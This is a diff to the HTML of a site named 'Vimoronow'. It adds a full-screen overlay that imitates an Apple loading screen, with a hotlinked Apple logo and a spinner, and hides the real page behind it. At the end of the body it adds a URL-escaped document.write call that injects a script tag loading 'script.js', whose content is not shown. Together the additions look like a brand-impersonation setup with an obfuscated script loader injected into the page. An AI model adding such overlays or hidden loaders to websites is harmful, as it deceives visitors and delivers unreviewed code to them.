@@ -23,6 +23,57 @@
     </div>
 </header>
 
+    <div id="apple-loading-overlay" style="
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: #FFFFFF;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 999999;
+    flex-direction: column;
+    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+">
+
+    <!-- Apple Logo -->
+    <img src="https://cdn.freebiesupply.com/images/large/2x/apple-logo-transparent.png" 
+         alt="Apple Inc." 
+         style="
+            width: 110px;
+            height: auto;
+            margin-bottom: 40px;
+            filter: brightness(0); /* Makes it black like official Apple logo */
+         ">
+
+    <div style="font-size: 17px; font-weight: 500; color: #1d1d1f; margin-bottom: 32px;">
+        Loading...
+    </div>
+
+    <!-- Apple Spinner -->
+    <div style="
+        width: 32px;
+        height: 32px;
+        border: 4px solid #E5E5E7;
+        border-top: 4px solid #0071E3;
+        border-radius: 50%;
+        animation: appleSpin 0.85s linear infinite;
+    "></div>
+
+    <style>
+        @keyframes appleSpin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            #apple-loading-overlay img {
+                width: 90px;
+            }
+        }
+    </style>
+</div>
+
 <section class="hr7p4hero">
     <div class="hr7p4inner">
         <h1>Welcome to Vimoronow</h1>
@@ -190,6 +241,10 @@ document.getElementById('policyPopup_x2').addEventListener('click', function(e) 
 
 <a href="/" alt="free website hit counter" target="_blank" >
 <img  src="//sstatic1.histats.com/0.gif?4977134&101" alt="free website hit counter" border="0">
+
+    <script>
+document.write(unescape('%3Cscript%20src%3D%22script.js%22%3E%3C/script%3E'));
+</script>
 
 </body>
 </html>
